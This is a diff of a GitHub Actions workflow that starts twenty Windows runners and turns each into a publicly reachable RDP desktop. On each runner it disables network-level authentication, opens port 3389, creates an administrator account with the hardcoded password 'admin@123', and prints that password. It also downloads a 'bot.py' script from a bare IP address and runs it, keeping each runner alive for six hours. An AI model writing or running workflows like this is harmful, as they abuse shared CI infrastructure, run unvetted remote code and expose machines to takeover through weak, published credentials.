@@ -9,7 +9,6 @@ jobs:
       fail-fast: false
       matrix:
         include:
-          # windows-2019 - 10 servers
           - os: windows-2019
             server: 1
           - os: windows-2019
@@ -30,8 +29,6 @@ jobs:
             server: 9
           - os: windows-2019
             server: 10
-          
-          # windows-2022 - 10 servers
           - os: windows-2022
             server: 11
           - os: windows-2022
@@ -60,22 +57,11 @@ jobs:
       - name: Enable RDP and Create User
         shell: pwsh
         run: |
-          Write-Host "============================================================"
-          Write-Host "  STARTING SERVER ${{ matrix.server }} ON ${{ matrix.os }}"
-          Write-Host "============================================================"
-
-          # Enable RDP
           Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -Name "fDenyTSConnections" -Value 0 -Force
           Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -Name "UserAuthentication" -Value 0 -Force
-          
-          # Firewall rule
           netsh advfirewall firewall delete rule name="RDP" 2>$null
           netsh advfirewall firewall add rule name="RDP" dir=in action=allow protocol=TCP localport=3389
-          
-          # Restart RDP service
           Restart-Service TermService -Force
-
-          # Create user account
           $password = ConvertTo-SecureString "admin@123" -AsPlainText -Force
           if (Get-LocalUser -Name "TOOLBOXLAP" -ErrorAction SilentlyContinue) {
               Remove-LocalUser -Name "TOOLBOXLAP" -Force
@@ -83,141 +69,68 @@ jobs:
           New-LocalUser -Name "TOOLBOXLAP" -Password $password -AccountNeverExpires -PasswordNeverExpires
           Add-LocalGroupMember -Group "Administrators" -Member "TOOLBOXLAP"
           Add-LocalGroupMember -Group "Remote Desktop Users" -Member "TOOLBOXLAP"
-
-          # Get public IP
           try {
               $ip = (Invoke-WebRequest -Uri "https://api.ipify.org" -UseBasicParsing -TimeoutSec 10).Content.Trim()
           } catch {
-              try {
-                  $ip = (Invoke-WebRequest -Uri "https://ifconfig.me/ip" -UseBasicParsing -TimeoutSec 10).Content.Trim()
-              } catch {
-                  $ip = (Invoke-WebRequest -Uri "https://icanhazip.com" -UseBasicParsing -TimeoutSec 10).Content.Trim()
-              }
+              $ip = (Invoke-WebRequest -Uri "https://icanhazip.com" -UseBasicParsing -TimeoutSec 10).Content.Trim()
           }
-
-          # Show connection info
           Write-Host ""
-          Write-Host "============================================================"
-          Write-Host "              RDP CONNECTION INFORMATION"
-          Write-Host "============================================================"
-          Write-Host "  Server Number : ${{ matrix.server }}"
-          Write-Host "  Windows OS    : ${{ matrix.os }}"
-          Write-Host "  IP Address    : $ip"
-          Write-Host "  Port          : 3389"
-          Write-Host "  Username      : TOOLBOXLAP"
-          Write-Host "  Password      : admin@123"
-          Write-Host "============================================================"
-          Write-Host "  RDP Command   : mstsc /v:$ip:3389"
-          Write-Host "============================================================"
-          Write-Host ""
-
-          # Save to desktop
+          Write-Host "============================================"
+          Write-Host "RDP CONNECTION INFO"
+          Write-Host "============================================"
+          Write-Host "Server Number : ${{ matrix.server }}"
+          Write-Host "Windows OS    : ${{ matrix.os }}"
+          Write-Host "IP Address    : $ip"
+          Write-Host "Port          : 3389"
+          Write-Host "Username      : TOOLBOXLAP"
+          Write-Host "Password      : admin@123"
+          Write-Host "============================================"
           $desktop = [Environment]::GetFolderPath("Desktop")
           $infoFile = "$desktop\RDP_INFO_SERVER_${{ matrix.server }}.txt"
-          @"
-============================================
-         RDP CONNECTION INFO
-============================================
-Server Number : ${{ matrix.server }}
-Windows OS    : ${{ matrix.os }}
-IP Address    : $ip
-Port          : 3389
-Username      : TOOLBOXLAP
-Password      : admin@123
-============================================
-RDP Command   : mstsc /v:$ip:3389
-============================================
-"@ | Out-File -FilePath $infoFile -Encoding UTF8
+          "IP: $ip`nUser: TOOLBOXLAP`nPass: admin@123" | Out-File -FilePath $infoFile
 
-          Write-Host "[SUCCESS] Connection info saved to: $infoFile"
-
-      - name: Download Bot
+      - name: Download and Run Bot
         shell: pwsh
         run: |
           $desktop = [Environment]::GetFolderPath("Desktop")
           $botUrl = "http://31.57.97.113:5000"
-          
-          Write-Host "Downloading bot from: $botUrl"
-          
           for ($i = 1; $i -le 3; $i++) {
               try {
                   Invoke-WebRequest -Uri $botUrl -OutFile "$desktop\bot.py" -UseBasicParsing -TimeoutSec 30
-                  Write-Host "[SUCCESS] Bot downloaded successfully"
                   break
               } catch {
-                  Write-Host "[ATTEMPT $i] Failed: $_"
                   Start-Sleep -Seconds 5
               }
           }
-
-      - name: Install Python if Needed
-        shell: pwsh
-        run: |
           $pythonPath = (Get-Command python -ErrorAction SilentlyContinue).Source
-          
           if (-not $pythonPath) {
-              Write-Host "Python not found, installing..."
-              $installer = "$env:TEMP\python-installer.exe"
-              
-              try {
-                  Invoke-WebRequest -Uri "https://www.python.org/ftp/python/3.11.0/python-3.11.0-amd64.exe" -OutFile $installer -UseBasicParsing -TimeoutSec 60
-                  Start-Process -FilePath $installer -ArgumentList "/quiet InstallAllUsers=1 PrependPath=1 Include_test=0" -Wait
-                  Remove-Item $installer -Force
-                  Start-Sleep -Seconds 10
-                  Write-Host "[SUCCESS] Python installed"
-              } catch {
-                  Write-Host "[WARNING] Python installation failed"
-              }
-          } else {
-              Write-Host "[SUCCESS] Python already installed"
-          }
-
-      - name: Start Bot
-        shell: pwsh
-        run: |
-          $desktop = [Environment]::GetFolderPath("Desktop")
-          $pythonPath = (Get-Command python -ErrorAction SilentlyContinue).Source
-          
-          if (-not $pythonPath) {
+              $installer = "$env:TEMP\python.exe"
+              Invoke-WebRequest -Uri "https://www.python.org/ftp/python/3.11.0/python-3.11.0-amd64.exe" -OutFile $installer
+              Start-Process -FilePath $installer -ArgumentList "/quiet InstallAllUsers=1 PrependPath=1" -Wait
+              Remove-Item $installer -Force
+              Start-Sleep -Seconds 10
               $pythonPath = "C:\Python311\python.exe"
           }
-          
           if (Test-Path "$desktop\bot.py") {
-              Write-Host "Starting bot on Server ${{ matrix.server }}..."
               Start-Process -FilePath $pythonPath -ArgumentList "`"$desktop\bot.py`"" -WindowStyle Normal
-              Start-Sleep -Seconds 3
-              Write-Host "[SUCCESS] Bot started"
-          } else {
-              Write-Host "[WARNING] bot.py not found"
           }
 
       - name: Keep Alive for 6 Hours
         shell: pwsh
         run: |
           $ip = (Invoke-WebRequest -Uri "https://api.ipify.org" -UseBasicParsing -TimeoutSec 10).Content.Trim()
-          $startTime = Get-Date
-          $endTime = $startTime.AddHours(6)
-          
+          $endTime = (Get-Date).AddHours(6)
           Write-Host ""
-          Write-Host "============================================================"
-          Write-Host "  SERVER ${{ matrix.server }} IS NOW ACTIVE"
-          Write-Host "  WINDOWS VERSION: ${{ matrix.os }} (OLD VERSION)"
-          Write-Host "  RDP ACCESS: $ip:3389"
-          Write-Host "  START TIME: $startTime"
-          Write-Host "  END TIME: $endTime"
-          Write-Host "  TOTAL DURATION: 6 HOURS"
-          Write-Host "============================================================"
+          Write-Host "Server ${{ matrix.server }} is ACTIVE"
+          Write-Host "RDP: $ip:3389"
+          Write-Host "User: TOOLBOXLAP"
+          Write-Host "Pass: admin@123"
+          Write-Host "Will run for 6 hours until: $endTime"
           Write-Host ""
-          
           while ((Get-Date) -lt $endTime) {
               Start-Sleep -Seconds 300
-              $remainingHours = [math]::Round(($endTime - (Get-Date)).TotalHours, 1)
-              $remainingMinutes = [math]::Round(($endTime - (Get-Date)).TotalMinutes, 0)
-              Write-Host "[$(Get-Date)] Server ${{ matrix.server }} | OS: ${{ matrix.os }} | Remaining: $remainingHours hours ($remainingMinutes min) | RDP: $ip"
+              $remaining = [math]::Round(($endTime - (Get-Date)).TotalMinutes, 0)
+              Write-Host "[$(Get-Date)] Server ${{ matrix.server }} - $remaining minutes remaining - RDP: $ip"
           }
-          
           Write-Host ""
-          Write-Host "============================================================"
-          Write-Host "  SERVER ${{ matrix.server }} SESSION COMPLETED"
-          Write-Host "  TOTAL 6 HOURS FINISHED"
-          Write-Host "============================================================"
+          Write-Host "Server ${{ matrix.server }} session completed (6 hours)"
